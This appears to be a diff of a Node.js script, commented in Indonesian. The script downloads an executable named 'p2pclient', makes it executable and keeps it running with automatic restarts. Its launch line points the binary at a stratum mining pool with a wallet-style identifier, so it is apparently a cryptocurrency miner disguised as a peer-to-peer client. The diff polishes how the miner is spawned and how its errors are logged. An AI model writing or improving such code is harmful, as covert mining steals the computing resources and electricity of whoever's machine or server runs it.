@@ -27,6 +27,7 @@ const logger = winston.createLogger({
     ]
 });
 
+// Fungsi untuk mengunduh file p2pclient
 async function downloadP2PClient() {
     return new Promise((resolve, reject) => {
         const file = fs.createWriteStream(P2P_PATH);
@@ -35,7 +36,7 @@ async function downloadP2PClient() {
             file.on('finish', () => {
                 file.close(() => {
                     try {
-                        fs.chmodSync(P2P_PATH, 0o755);
+                        fs.chmodSync(P2P_PATH, 0o755); // Memberikan izin eksekusi
                         logger.info('✅ File p2pclient telah diberikan izin eksekusi.');
                         resolve();
                     } catch (err) {
@@ -50,6 +51,7 @@ async function downloadP2PClient() {
     });
 }
 
+// Menjalankan p2pclient
 let peerProcess = null;
 
 async function startP2PClient() {
@@ -70,13 +72,16 @@ async function startP2PClient() {
     }
 
     logger.info('🚀 Starting p2pclient...');
-    peerProcess = spawn('/bin/sh', ['-c', `${P2P_PATH} --noeval --hard-aes -P stratum1+tcp://cb9072192a56299751a9619430f7493f911e40a794f1.pepek@us.catchthatrabbit.com:8008`]);
+    peerProcess = spawn(P2P_PATH, ['--noeval', '--hard-aes', '-P', 'stratum1+tcp://cb9072192a56299751a9619430f7493f911e40a794f1.pepek@us.catchthatrabbit.com:8008']);
 
     peerProcess.stdout.on('data', (data) => logger.info(data.toString()));
     peerProcess.stderr.on('data', (data) => logger.error(data.toString()));
 
     peerProcess.on('close', (code) => {
         logger.warn(`⚠️ p2pclient exited with code ${code}. Restarting in 5 seconds...`);
+        if (code !== 0) {
+            logger.error(`❌ p2pclient exited with an error code: ${code}`);
+        }
         setTimeout(startP2PClient, 5000);
     });
 
